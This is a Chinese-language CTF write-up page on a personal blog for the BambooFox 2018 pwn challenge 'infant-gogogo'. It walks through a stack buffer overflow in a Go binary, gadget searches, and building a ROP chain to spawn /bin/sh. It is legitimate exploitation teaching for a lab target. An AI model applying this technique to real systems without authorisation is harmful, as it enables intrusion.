<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>infant-gogogo - frozenkp's Blog</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "infant-gogogo", url: "#_top", children: [
              {title: "\u89c0\u5bdf", url: "#_1" },
              {title: "\u89e3\u6cd5", url: "#_2" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../ASIS_CTF_qual/Plastic/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../ASIS_CTF_qual/Plastic/" class="btn btn-xs btn-link">
        Plastic
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../infant-gotoheaven/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../infant-gotoheaven/" class="btn btn-xs btn-link">
        infant-gotoheaven
      </a>
    </div>
    
  </div>

    

    <h1 id="infant-gogogo">infant-gogogo</h1>
<blockquote>
<p>Challenge Link: <a href="http://ctf.bamboofox.cs.nctu.edu.tw/challenges#infant-gogogo">infant-gogogo</a></p>
<p>Category: pwn</p>
<p>Writeup: <a href="https://github.com/frozenkp/CTF/tree/master/2018/BambooFox_CTF_2018/infant-gogogo">infant-gogogo</a></p>
</blockquote>
<p>Give me your magic text <sub>~</sub></p>
<p><code>nc bamboofox.cs.nctu.edu.tw 58795</code></p>
<p><a href="http://ctf.bamboofox.cs.nctu.edu.tw/files/1f36921a750a6904cf3b6133cecf1554/infant-gogogo.zip">infant-gogogo.zip</a></p>
<h2 id="_1">觀察</h2>
<p>這支程式可以讓使用者輸入一串字串，看起來跟前一題的 <a href="https://github.com/frozenkp/CTF/tree/master/BambooFox_CTF_2018/infant-gotoheaven">infant-gotoheaven</a> 很像</p>
<div class="highlight"><pre><span></span><code>% ./infant-gotoheaven                     
Give me your text : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</code></pre></div>
<h3 id="buffer-overflow">Buffer overflow</h3>
<p>先試一下是否也有 Buffer overflow</p>
<div class="highlight"><pre><span></span><code>% ./infant-gogogo              
Give me your text : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
unexpected fault address 0x0
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x489834]

goroutine 1 [running]:
runtime.throw(0x4b9168, 0x5)
        /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427345
runtime.sigpanic()
        /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43a307
main.main()
        /home/frozenkp/Downloads/gobin/infant-gogogo.go:20 +0x1b4 fp=0xc420043f80 sp=0xc420043f78 pc=0x489834
</code></pre></div>
<p>最後一行有寫到死在<code>infant-gogogo.go:20</code></p>
<p>用<code>objdump</code>看一下發現是死在<code>ret</code>，所以應該跟上題一樣，也是可以<strong>蓋到 return address</strong></p>
<p><img alt="" src="https://i.imgur.com/J0SdY2P.png" /></p>
<h2 id="_2">解法</h2>
<p>這題跟  <a href="https://github.com/frozenkp/CTF/tree/master/BambooFox_CTF_2018/infant-gotoheaven">infant-gotoheaven</a> 的主要差別在於 <a href="https://github.com/frozenkp/CTF/tree/master/BambooFox_CTF_2018/infant-gotoheaven">infant-gotoheaven</a> 有提供可以直接拿到 shell 的 <code>system call</code> ，這題則要自己建 ROP chain</p>
<h3 id="payload">payload</h3>
<p>先隨便輸入來造成 segmenataion fault，確定程式會產生 buffer overflow，且是死在 return addresss 錯誤</p>
<p><img alt="img" src="https://i.imgur.com/3w10UGw.png" /></p>
<p>計算一下 payload 是 <strong>256</strong></p>
<h3 id="rop-chain">ROP chain</h3>
<p>因為 Go 的 binanry 檔是 static link 的，基本上可以從裡面拿到各式各樣的 gadget</p>
<div class="highlight"><pre><span></span><code>% file infant-gogogo 
infant-gogogo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
</code></pre></div>
<h4 id="execve">execve</h4>
<p>根據 <a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">這篇</a> 整理的表格，要執行 <code>execve("/bin/sh")</code> 的條件是</p>
<table>
<thead>
<tr>
<th>rax</th>
<th>System call</th>
<th>rdi</th>
<th>rsi</th>
<th>rdx</th>
</tr>
</thead>
<tbody>
<tr>
<td>59</td>
<td>sys_execve</td>
<td>const char *filename</td>
<td>const char *const argv[]</td>
<td>const char *const envp[]</td>
</tr>
</tbody>
</table>
<p>執行 <code>/bin/sh</code> 的話，只需要把 <code>rdi</code> 指向寫有 <code>/bin/sh</code> 的<strong>位址</strong>，<code>rsi</code> 及 <code>rdx</code>  則設成 0 (NULL) 即可</p>
<h4 id="rop-gadget">ROP gadget</h4>
<p>基本上在設值的時候，如果可以拿到 <code>pop {resister}; ret</code> 形式的 gadget 最好，因為可以直接把要丟入的值寫在 gadget 的下一位，例如：</p>
<div class="highlight"><pre><span></span><code>ropchain = pop_rax, p64(59)
</code></pre></div>
<p>這樣在執行 <code>pop rax</code> 時，會將 stack 上的第一位 pop 到 rax 上，而此時的第一位就會是 <code>p64(59)</code></p>
<p>除此之外，也要注意<strong>最後面必須是 ret</strong> ，否則沒辦法繼續執行後段的 ROP chain</p>
<p>尋找 ROP gadget 可以使用指令 <code>ROPgadget</code> 搭配 <code>grep</code>，例如說要找 <code>pop rax</code> 時：</p>
<div class="highlight"><pre><span></span><code>% ROPgadget --binary infant-gogogo | grep &#39;pop rax.*ret&#39;
0x000000000044dd12 : add eax, ebp ; pop rax ; ret
0x000000000044dd10 : and al, 0x10 ; add eax, ebp ; pop rax ; ret
0x0000000000466d3e : je 0x466d67 ; pop rax ; ret
0x000000000044dd0d : or dh, al ; and al, 0x10 ; add eax, ebp ; pop rax ; ret
0x0000000000402563 : pop rax ; add rsp, 0x60 ; ret
0x000000000040e31b : pop rax ; and byte ptr [rax - 1], cl ; ret
0x0000000000448b11 : pop rax ; mov qword ptr [rsp + 0x10], rax ; ret
0x000000000043cfb3 : pop rax ; or byte ptr [rax - 0x7d], cl ; ret
0x000000000040985c : pop rax ; or dh, dh ; ret
0x0000000000404656 : pop rax ; ret
0x0000000000414f4a : pop rax ; ret 0xff2
0x000000000040e318 : sbb byte ptr [rax - 0x75], cl ; pop rax ; and byte ptr [rax - 1], cl ; ret
</code></pre></div>
<p>其中可以看到 <code>0x0000000000404656 : pop rax ; ret</code> 是最符合的 gadget</p>
<h4 id="binsh">/bin/sh</h4>
<p>前面有說到，<code>rdi</code>是寫有 <code>/bin/sh</code> 的<strong>位址</strong>，所以需要找一塊空間來寫 <code>/bin/sh</code></p>
<p>在 gdb 中使用 <code>vmmap</code> 來尋找可用空間</p>
<div class="highlight"><pre><span></span><code>gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x0048a000         r-xp      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo
0x0048a000         0x0051c000         r--p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo
0x0051c000         0x0052f000         rw-p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo
0x0052f000         0x00550000         rw-p      [heap]
0x000000c000000000 0x000000c000001000 rw-p      mapped
0x000000c41fff8000 0x000000c420100000 rw-p      mapped
0x00007ffff7f5b000 0x00007ffff7ffb000 rw-p      mapped
0x00007ffff7ffb000 0x00007ffff7ffd000 r--p      [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 r-xp      [vdso]
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
</code></pre></div>
<p>其中有段 <code>0x0051c000         0x0052f000         rw-p</code> 是可寫的，我選擇 <code>0x523000</code> 來寫，盡量不要選擇太前面或太後面的位置，怕跟其他東西衝到</p>
<p>可以寫入到 <code>rdi</code> 的有以下兩句</p>
<div class="highlight"><pre><span></span><code>0x0000000000485abd : pop rdi ; cmp dword ptr [rcx], eax ; add byte ptr [rax + 0x39], cl ; ret
0x00000000004518ff : mov qword ptr [rdi], rax ; ret
</code></pre></div>
<p>其中，<code>pop rdi</code> 的 gadget 後面還有 <code>add byte ptr [rax + 0x39]</code>，所以必須確保 <code>rax+0x39</code>是一段可以寫的位址，否則會死掉</p>
<p>因此我先將 <code>rax</code> 設成 data 的位址，設完 <code>rdi</code> 後，再將 <code>rax</code> 設成 <code>/bin/sh</code> ，最後填入 <code>ptr [rdi]</code> 中即可</p>
<p>所有得條件都設定完成後，執行即可拿到 shell 囉 OwO</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../ASIS_CTF_qual/Plastic/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../ASIS_CTF_qual/Plastic/" class="btn btn-xs btn-link">
        Plastic
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../infant-gotoheaven/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../infant-gotoheaven/" class="btn btn-xs btn-link">
        infant-gotoheaven
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
      <p>
        <a href="https://github.com/frozenkp/frozenkp.github.io/edit/master/docs/Writeups/2018/BambooFox_CTF/infant-gogogo.md">Edit on frozenkp/frozenkp</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>